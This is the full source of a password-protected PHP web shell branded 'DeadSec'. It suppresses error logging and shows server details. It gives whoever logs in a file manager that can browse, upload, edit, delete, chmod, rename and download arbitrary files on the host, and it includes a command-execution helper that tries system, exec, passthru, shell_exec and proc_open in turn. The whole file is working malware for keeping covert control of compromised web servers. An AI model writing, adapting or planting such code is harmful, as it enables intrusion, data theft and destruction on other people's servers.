<?php
@ini_set("error_log", NULL);
@ini_set("log_errors", 0);
@error_reporting(0);
@error_log(false);
@session_start();
define("username", "thqxploit");
define("passwd", "03cb2f33ec5822382ade49ff71b8bd50");


if (strtolower(substr(PHP_OS, 0, 3)) === "win") {
    $os = "Windows";
} else {
    $os = "Linux";
}
function sanitize($str)
{
    return filter_var(htmlspecialchars($str), FILTER_SANITIZE_FULL_SPECIAL_CHARS);
}

function login_shell()
{
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOGIN DeadSec</title>
    <link href="https://fonts.googleapis.com/css2?family=Creepster&family=Caveat+Brush&display=swap" rel="stylesheet">
    <link rel="shortcut icon"
        href="https://wallpapercave.com/wp/wp4020127.jpg" type="image/x-icon">
</head>
<style>
    :root {
        --text-color: #fff;
        --text-red: rgb(255, 0, 0);
        --box-color: #202e62;
        --unactive: rgb(98, 98, 98);
    }

    * {
        margin: 0;
        padding: 0;
    }

    html {
        height: 100vh;
        width: 100%;
    }

    body {
        overflow: hidden;
        background-image: url(https://pomf2.lain.la/f/1jhntt0.jpg);
        background-color: black;
        background-size: cover;
        background-repeat: no-repeat;
        align-items: center;
    }

    .login-form {
        height: 100vh;
        width: 100%;
        position: inherit;
        box-sizing: border-box;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
    }

    .logo {
        font-family: 'Creepster', cursive;
        color: var(--text-color);
        font-size: 50px;
    }

    .logo span {
        color: var(--text-red);
    }

    .login-box {
        width: 300px;
        background-color: var(--box-color);
        padding: 40px;
        margin-top: 10px;
        border-radius: 15px;
        box-shadow: 0px 3px 3px 0px rgba(0, 0, 0, 0.12), 0px 3px 6px 0px rgba(0, 0, 0, 0.22), 0px 5px 10px 0px rgba(0, 0, 0, 0.2), 0px 8px 12px 1px rgba(0, 0, 0, 0.19);
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }

    .login-box input {
        margin-top: 20px;
        border-radius: 5px;
        padding: 10px;
        border: 1px solid var(--unactive);
        background-color: var(--box-color);
        outline: none;
        color: var(--text-color);
    }

    .login-box .inputBox {
        position: relative;
        width: 100%;
        display: flex;
        flex-direction: column;
    }

    .inputBox span {
        color: var(--unactive);
        top: 20px;
        position: absolute;
        padding: 10px;
        pointer-events: none;
        transition: 300ms;
    }

    .login-box input:valid~span,
    .login-box input:focus~span {
        color: var(--text-color);
        transform: translateX(10px) translateY(-7px);
        font-size: 0.8em;
        padding: 0 10px;
        background: var(--box-color);
    }

    .submit {
        display: flex;
        justify-content: center;
    }

    .error {
        color: var(--text-red);
    }

    .quote {
        color: var(--text-color);
        font-family: 'Caveat Brush';
        font-size: 25px;
    }

    .copyright {
        display: flex;
        justify-content: center;
        margin: 10px;
        font-family: 'caveat Brush';
        color: var(--text-color);
        font-size: 20px;
    }

    .hidden {
        visibility: hidden;
    }

    @media only screen and (max-width: 480px) {
        body {
            background-image: url(https://wallpapercave.com/wp/wp4020127.jpg);
        }

        .login-box {
            width: calc(100vw - 100px);
        }

        .quote {
            font-size: 20px;
        }
    }
</style>

<body>
    <div class="login-form">
        <h1 class="logo">LOGIN<span> DeadSec</span></h1>
        <div class="login-box">
            <p class="quote">haha login first little bastard</p>
            <form method="post">
                <?php
    $login_error = '<p class="error">sukses login!.</p>';
    if (isset($_POST["log"]) && $_POST["log"] === "login") {
        if (isset($_POST["username"]) && $_POST["username"] !== username || isset($_POST["password"]) && md5($_POST["password"]) !== passwd) {
            echo $login_error;
        }
    } ?>
                <input type="hidden" name="log" value="login">
                <div class="inputBox">
                    <input type="text" name="username" required>
                    <span>Username</span>
                </div>
                <div class="inputBox">
                    <input type="password" name="password" required>
                    <span>Password</span>
                </div>
                <div class="submit">
                    <input type="submit" value="Login">
                </div>
            </form>
        </div>
        <div class="copyright"><span>&copy DeadSec 2023</span></div>
    </div>
</body>

</html>
<?php
}


function perms($file)
{
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 
        (($perms & 0x0800) ? 's' : 'x') :
        (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 
        (($perms & 0x0400) ? 's' : 'x') :
        (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 
        (($perms & 0x0200) ? 't' : 'x') :
        (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
function execute($cmd)
{
    $cmd .= " 2>&1";
    if (function_exists("system")) {
        @ob_start();
        system($cmd);
        $stdout = @ob_get_contents();
        @ob_end_clean();
    } elseif (function_exists("exec")) {
        exec($cmd, $output);
        $stdout = @join("\n", $output);
    } elseif (function_exists("passthru")) {
        @ob_start();
        passthru($cmd);
        $stdout = @ob_get_contents();
        @ob_end_clean();
    } elseif (function_exists("shell_exec")) {
        $stdout = shell_exec($cmd);
    } elseif (function_exists("proc_open")) {
        $stdout = "";
        $std = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
        $handle = proc_open($cmd, $std, $pipes);
        if (is_resource($handle)) {
            if (function_exists("fread") && function_exists("feof")) {
                while (!feof($pipes[1])) {
                    $stdout .= fread($pipes[1], 512);
                }
            } elseif (function_exists("fgets") && function_exists("feof")) {
                while (!feof($pipes[1])) {
                    $stdout .= fgets($pipes[1], 512);
                }
            }
        }
    } else
        $stdout = "All executable function is disabled.";
    return $stdout;
}
function fsize($filepath)
{
    if (is_file($filepath)) {
        $size = filesize($filepath);
        if ($size >= 1073741824) {
            $size = round($size / 1073741824, 2) . " GB";
        } elseif ($size >= 1048576) {
            $size = round($size / 1048576, 2) . " MB";
        } else {
            $size = round($size / 1024, 2) . " KB";
        }
        return $size;
    }
}
function getint($int)
{
    $num = 0;
    for ($i = strlen($int) - 1; $i >= 0; --$i) {
        $num += (int) $int[$i] * pow(8, (strlen($int) - $i - 1));
    }
    return $num;
}
function forcedelete($path)
{
    $path = (substr($path, -1) === "/") ? $path : $path . "/";
    $dirs = @opendir($path);
    while (($item = @readdir($dirs)) !== false) {
        $item = $path . $item;
        if ((basename($item) === "..") || (basename($item) === ".")) {
            continue;
        }
        $type = @filetype($item);
        if ($type === "dir") {
            forcedelete($item);
        } else {
            @unlink($item);
        }
    }
    @closedir($dirs);
    return @rmdir($path);
}
function download($path)
{
    if (file_exists($path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($path));
        readfile($path);
        exit;
    }
}
function mini_shell()
{
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login To DeadSec</title>
    <link rel="shortcut icon"
        href="https://wallpapercave.com/wp/wp4020127.jpg" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Rubik+Vinyl&family=Caveat+Brush&display=swap" rel="stylesheet">
</head>
<style>
    :root {
        --box-color: #6f00ff;
        --text-color: #fff;
        --red-text: rgb(255, 0, 0);
        --background-color: #000000;
        ---green-text: #00ff11;
        --back-hover: #2a2a2a;
    }

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    ::-webkit-scrollbar {
        width: 2px;
    }

    ::-webkit-scrollbar {
        background-color: transparent;
        height: 80px;
    }

    body {
        overflow-x: hidden;
        background-color: var(--background-color);
        color: var(--text-color);
        font-family: monospace;
    }

    .main {
        max-width: calc(100% - 10px);
        display: flex;
        align-items: center;
        flex-direction: column;
    }

    .logo {
        user-select: none;
        color: var(--text-color);
        font-family: 'Creepster';
        padding: 10px;
    }

    .logo span {
        color: var(--red-text);
    }

    .header ul li {
        font-size: 0.8em;
        margin-left: 5px;
    }

    .header ul li span {
        color: var(---green-text);
    }

    .path {
        font-size: 0.8em;
        padding: 10px;
        white-space: normal;
        overflow-wrap: break-word;
        text-align: center;
        width: 80%;
    }

    .path a {
        text-decoration: none;
        color: var(---green-text);
    }

    .path a:hover {
        color: var(--text-color);
    }

    .file-upload {
        position: relative;
        cursor: pointer;
        overflow: hidden;
    }

    .file-upload input[type='file'] {
        color: var(---green-text);
        border: 1px solid var(--text-color);
        font-family: 'Caveat Brush';
        border-radius: 4px;
        cursor: pointer;
    }

    .file-upload input[type='file']::-webkit-file-upload-button {
        background-color: transparent;
        color: var(--text-color);
        font-family: 'Caveat Brush';
        text-transform: uppercase;
        cursor: pointer;
        border: none;
    }

    .file-upload button[type=submit] {
        background-color: var(--background-color);
        color: var(---green-text);
        border: 1px solid var(--text-color);
        padding: 3px;
        border-radius: 4px;
        cursor: pointer;
        text-transform: uppercase;
        font-family: 'Caveat Brush';
    }

    .success {
        color: var(---green-text);
    }

    .error {
        color: var(--red-text);
    }

    .success,
    .error {
        margin: 5px;
        text-transform: uppercase;
        font-family: 'Caveat Brush';
    }

    .current {
        color: var(--text-color);
        font-size: 0.8em;
        margin-top: 10px;
        overflow-wrap: break-word;
        text-align: center;
    }

    .current span {
        color: var(---green-text);
    }

    .filesource {
        width: calc(100% - 10px);
        border: 1px solid var(--text-color);
        border-radius: 5px;
        padding: 5px;
        background-color: var(--background-color);
        color: var(---green-text);
        margin-top: 10px;
        word-wrap: break-word;
        overflow-wrap: break-word;
        height: 420px;
        font-size: 0.8em;
    }

    .filesource::-webkit-scrollbar {
        width: 7px;
    }

    .filesource::-webkit-scrollbar-thumb {
        border-radius: 10px;
        height: 80px;
        background-color: var(--text-color);
    }

    .files {
        margin-top: 10px;
        border: 1px solid var(--text-color);
        width: calc(100vw - 20px);
        border-radius: 7px;
        font-size: 10px;
    }

    .files tr:hover {
        background-color: var(--back-hover);
    }

    .files tr th {
        padding: 6px;
        font-family: 'Caveat Brush';
        font-weight: 100;
        font-size: 18px;
    }

    .files tr td {
        text-align: center;
    }

    .files tr td:nth-child(1) {
        max-width: 20vw;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
    }

    .files tr td a {
        text-decoration: none;
        color: var(---green-text);
    }

    .files tr td a:hover {
        color: var(--text-color);
    }

    .files tr td:nth-child(4) {
        max-width: 20vw;
    }

    .files tr td select {
        background-color: var(--background-color);
        border: 1px solid var(--red-text);
        border-radius: 3px;
        color: var(--text-color);
        font-family: 'Caveat Brush';
    }

    .files tr td button[type=submit] {
        background-color: var(--background-color);
        border: 1px solid var(--text-color);
        border-radius: 3px;
        color: var(--text-color);
    }

    .copyright {
        display: flex;
        justify-content: center;
        margin: 10px;
    }

    .action {
        margin: 5px;
    }

    .action input {
        background-color: var(--background-color);
        color: var(---green-text);
        border: 1px solid var(--text-color);
        border-radius: 3px;
        padding: 1px;
        outline: none;
    }

    .action button[type=submit] {
        background-color: var(--background-color);
        color: var(--text-color);
        border: 1px solid var(--text-color);
        border-radius: 3px;
        font-family: 'Caveat Brush';
        text-transform: uppercase;
    }

    .fileedit {
        width: calc(100vw - 30px);
        margin: 0px 10px;
        margin-top: 1vh;
        min-height: 50vh;
        background-color: var(--background-color);
        color: var(--text-color);
        border: 1px solid var(---green-text);
        border-radius: 10px;
    }

    #edit {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }

    #edit button {
        margin-top: 1vh;
        width: 10vw;
        background-color: var(--background-color);
        border: 1px solid var(--text-color);
        border-radius: 3px;
        color: var(---green-text);
        text-transform: uppercase;
        font-family: 'Caveat Brush';
    }
</style>

<body>
    <div class="main">
        <div class="logo">
            <h1>Welcome To<span> DeadSec Security</span></h1>
        </div>
        <div class="header">
            <ul>
                <li>Uname: <span>
                        <?php echo php_uname(); ?>
                    </span></li>
                <li>Server IP: <span>
                        <?php echo isset($_SERVER["SERVER_ADDR"]) ? $_SERVER["SERVER_ADDR"] : "Unknown"; ?>
                    </span> | Your IP: <span>
                        <?php echo isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : "Unknown"; ?>
                    </span></li>
                <li>PHP version: <span>
                        <?php echo phpversion(); ?>
                    </span></li>
                <li>Software: <span>
                        <?php echo isset($_SERVER["SERVER_SOFTWARE"]) ? $_SERVER["SERVER_SOFTWARE"] : "Unknown"; ?>
                    </span></li>
            </ul>
        </div>
        <div class="path">
            <span>Current path:~$</span>
            <?php
    if (isset($_GET["path"]) && file_exists($_GET["path"])) {
        $path = sanitize($_GET["path"]);
    } else
        $path = sanitize(getcwd());
    $path = str_replace("\\", "/", $path);
    $paths = explode("/", $path);
    for ($i = 0; $i < count($paths); $i++) {
        if ($i === 0 && $paths[$i] === '') {
            echo "<a href=\"?path=/\">/</a>";
            continue;
        }
        if ($paths[$i] === '')
            continue;
        echo "<a href=\"?path=";
        for ($x = 0; $x <= $i; $x++) {
            echo $paths[$x];
            if ($x != $i) {
                echo "/";
            }
        }
        echo "/\">" . $paths[$i] . "</a>/";
    }
            ?>

        </div>
        <form method="post" enctype="multipart/form-data">
            <div class="file-upload">
                <input type="file" name="fileUp" required>
                <button type="submit">Submit</button>
            </div>
        </form>
        <?php
    if (!is_readable($path))
        echo "<div class=\"error\">Cannot read directory. (Not readable)</div>";
    elseif (!is_writable($path))
        echo "<div class=\"error\">Not writable path (RED DIR)</div>";
    $upload_success = "<div class=\"success\"><span>File uploaded successfully.</span></div>";
    if (isset($_FILES["fileUp"])) {
        if (function_exists("move_uploaded_file") && @move_uploaded_file($_FILES["fileUp"]["tmp_name"], $path . "/" . $_FILES["fileUp"]["name"])) {
            echo $upload_success;
        } elseif (function_exists("copy") && @copy($_FILES["fileUp"]["tmp_name"], $path . "/" . $_FILES["fileUp"]["name"])) {
            echo $upload_success;
        } else
            echo "<div class=\"error\"><span>Failed to upload.</span></div>";
    }
    if (isset($_POST["option"]) && $_POST["option"] === "chmod" && isset($_POST["path"])) {
        if (isset($_POST["chmod"]) && @chmod($_POST["path"], getint($_POST["chmod"]))) {
        ?>
        <div class="success">Permission changed successfully.</div>
        <?php
        } elseif (isset($_POST["chmod"])) {
        ?>
        <div class="error">Failed to change permission.</div>
        <?php
        }
        ?>
        <div class="action">
            <form method="post">
                <input type="hidden" name="path" value="<?php echo $_POST["path"]; ?>">
                <input type="hidden" name="option" value="chmod">
                <span>Chmod: </span>
                <input type="number" name="chmod" placeholder="0777">
                <button type="submit">Submit</button>
            </form>
        </div>
        <?php
    } elseif (isset($_POST["option"]) && $_POST["option"] === "rename" && isset($_POST["path"]) && isset($_POST["name"])) {
        if (isset($_POST["rename"]) && @rename($_POST["path"], $_POST["rename"])) {
        ?>
        <div class="success">Success</div>
        <?php
        } elseif (isset($_POST["rename"])) {
        ?>
        <div class="error">Cannot rename file. An error occurred.</div>
        <?php
        }
        ?>
        <div class="action">
            <form method="post">
                <input type="hidden" name="path" value="<?php echo $_POST["path"]; ?>">
                <input type="hidden" name="option" value="rename">
                <input type="hidden" name="name" value="<?php echo $_POST["name"]; ?>">
                <span>Rename file: </span>
                <input type="text" name="rename" value="<?php echo $_POST["name"]; ?>">
                <button type="submit">Submit</button>
            </form>
        </div>
        <?php
    } elseif (isset($_POST["option"]) && $_POST["option"] === "delete" && isset($_POST["path"]) && isset($_POST["type"])) {
        if ($_POST["type"] === "dir") {
            if (forcedelete($_POST["path"])) {
        ?>
        <div class="success">Directory deleted successfully.</div>
        <?php
            } else {
        ?>
        <div class="error">Failed to delete directory.</div>
        <?php
            }
        } else {
            if (@unlink($_POST["path"])) {
        ?>
        <div class="success">File deleted successfully.</div>
        <?php
            } else {
        ?>
        <div class="error">Failed to delete file.</div>
        <?php
            }
        }
    } elseif (isset($_POST["option"]) && $_POST["option"] === "edit" && isset($_POST["path"])) {
        if (isset($_POST["content"]) && !is_dir($_POST["path"])) {
            $fopen = @fopen($_POST["path"], "w");
            if (@fwrite($fopen, $_POST["content"])) {
        ?>
        <div class="success">File edited successfully.</div>
        <?php
            } else {
        ?>
        <div class="error">Failed to edit file content.</div>
        <?php
            }
            @fclose($fopen);
        }
        ?>
        <form method="post" id="edit">
            <input type="hidden" name="path" value="<?php echo $_POST["path"]; ?>">
            <input type="hidden" name="option" value="edit">
            <textarea name="content" id=""
                class="fileedit"><?php echo htmlentities(file_get_contents($_POST["path"]), ENT_QUOTES, 'UTF-8') ?></textarea>
            <button type="submit">Submit</button>
        </form>
        <?php
    }
    if (isset($_GET["filesource"]) && file_exists($_GET["filesource"])) {
        echo "<div class=\"current\">File: <span>" . basename($_GET["filesource"]) . "</span></div>";
        echo "<textarea class=\"filesource\" readonly>" . htmlentities(file_get_contents($_GET["filesource"]), ENT_QUOTES, 'UTF-8') . "</textarea>";
    } elseif (is_readable($path)) {
        $scandir = @scandir($path);
        ?>
        <table class="files">
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Permission</th>
                <th>Options</th>
            </tr>
            <?php
        for ($i = 0; $i < count($scandir); $i++) {
            if (!is_dir($path . "/" . $scandir[$i]) || $scandir[$i] === "." || $scandir[$i] === "..")
                continue;
            ?>

            <tr>
                <td><a href="?path=<?php echo $path . "/" . $scandir[$i] . "/"; ?>">
                        <?php echo $scandir[$i]; ?>
                    </a></td>
                <td>-</td>
                <td>
                    <?php
            $pathdir = $path . "/" . $scandir[$i];
            if (is_writable($pathdir)) {
                echo "<font color=lime>";
            } elseif (is_readable($pathdir)) {
                echo "<font color=grey>";
            } else {
                echo "<font color=red>";
            }
            echo perms($pathdir) . "</font>";
                    ?>
                </td>
                <td>
                    <form method="post">
                        <input type="hidden" name="type" value="dir">
                        <input type="hidden" name="name" value="<?php echo $scandir[$i]; ?>">
                        <input type="hidden" name="path" value="<?php echo $pathdir; ?>">
                        <select name="option" required>
                            <option value="">Action</option>
                            <option value="delete">Delete</option>
                            <option value="chmod">Chmod</option>
                            <option value="rename">Rename</option>
                        </select>
                        <button type="submit">>></button>
                    </form>
                </td>
            </tr>
            <?php
        }
        for ($i = 0; $i < count($scandir); $i++) {
            $filepath = $path . "/" . $scandir[$i];
            if (is_dir($filepath)) {
                continue;
            } ?>
            <tr>
                <td><a href="?path=<?php echo $path; ?>&filesource=<?php echo $filepath; ?>">
                        <?php echo $scandir[$i]; ?>
                    </a></td>
                <td>
                    <?php echo fsize($filepath); ?>
                </td>
                <td>
                    <?php
            if (is_writable($filepath)) {
                echo "<font color=lime>";
            } elseif (is_readable($filepath)) {
                echo "<font color=grey>";
            } else {
                echo "<font color=red>";
            }
            echo perms($filepath) . "</font>";
                    ?>
                </td>
                <td>
                    <form method="post">
                        <input type="hidden" name="type" value="file">
                        <input type="hidden" name="name" value="<?php echo $scandir[$i]; ?>">
                        <input type="hidden" name="path" value="<?php echo $filepath; ?>">
                        <select name="option" required>
                            <option value="">Action</option>
                            <option value="edit">Edit</option>
                            <option value="delete">Delete</option>
                            <option value="chmod">Chmod</option>
                            <option value="rename">Rename</option>
                            <option value="download">Download</option>
                        </select>
                        <button type="submit">>></button>
                    </form>
                </td>
            </tr>
            <?php
        }
            ?>
        </table>
        <?php
    }
        ?>

    </div>
    <div class="copyright">
        <span>&copy DemonArmy</span>
    </div>
</body>

</html>
<?php
}











if (isset($_POST["log"])) {
    if ($_POST["log"] === "login") {
        if (isset($_POST["username"]) && $_POST["username"] === username && isset($_POST["password"]) && md5($_POST["password"]) === passwd) {
            $_SESSION["webshell"] = passwd;
        }
    } elseif ($_POST["log"] === "logout") {
        @session_destroy();
    }
}
if (!isset($_SESSION["webshell"]) || $_SESSION["webshell"] !== passwd) {
    login_shell();
} elseif (isset($_POST["option"]) && $_POST["option"] === "download" && isset($_POST["path"]) && !is_dir($_POST["path"])) {
    download($_POST["path"]);
} else {
    mini_shell();
}
